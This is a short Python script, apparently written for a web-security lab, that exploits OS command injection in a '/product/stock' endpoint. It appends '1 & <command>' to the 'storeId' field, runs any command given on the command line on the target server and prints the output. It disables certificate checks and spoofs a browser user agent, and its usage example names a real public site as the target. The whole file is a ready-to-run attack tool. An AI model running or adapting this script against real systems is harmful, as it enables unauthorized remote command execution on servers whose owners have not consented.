#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from colorama import init, Fore, Back, Style
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:1082', 'https': 'http://127.0.0.1:1082'}

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36'}

def run_command(url, command):
	stock_path = '/product/stock'
	command_injection = '1 & ' + command
	params = {'productId': '2', 'storeId': command_injection}
	req = requests.post(url + stock_path, data=params, headers=header, verify=False)#,  proxies=proxies)

	if (req.status_code == 200 and len(req.text) > 3):
		print("\033[1;32;40m[+] Command injection successful!")
		print("\033[1;33;40m[+] Output of command: " + req.text)
	else:
		print("\033[1;31;40m[-] Command injection failed.")

def main():
	if len(sys.argv) != 3:
		print("\033[1;31;40m[+] Usage: %s <url> <command>" % sys.argv[0])
		print("\033[1;31;40m[+] Example: %s https://www.bing.com whoami" %sys.argv[0])
		sys.exit(-1)

	# filter end of url /
	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	command = sys.argv[2]
	
	print("\033[36m[+] Exploting command injection...")
	
	run_command(url, command)


if __name__ == "__main__":
	main()